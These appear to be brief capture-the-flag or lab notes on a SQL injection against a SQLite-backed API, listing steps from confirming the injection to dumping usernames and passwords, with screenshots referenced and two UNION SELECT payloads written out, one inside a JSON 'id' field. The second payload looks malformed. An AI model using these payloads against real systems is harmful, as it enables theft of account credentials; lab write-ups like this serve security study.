
there was a bit of fiddling with the token

confirm sqli (or at least math :D)
![[burp1.png]]

Get version
![[burp2.png]]

Get tables
![[burp3.png]]

Get columns
![[burp4.png]]


Get usernames
![[burp5.png]]

Get passwords
![[burp6.png]]

Prettier output
![[burp7.png]]
```sql
2 UNION SELECT 'usernames: ' || group_concat(username,', ') || ' - ' || 'passwords: ' || group_concat(password,', ') FROM accounts -- -
```

```
{
    "id": "2 UNION SELECT sqlite_version() || ', [' || group_concat(tbl_name,', ') FROM sqlite_master WHERE type='table' || '], [usernames: ' || group_concat(username,', ') FROM accounts || ' - passwords: ' || group_concat(password,', ') FROM accounts || ']'"
}
```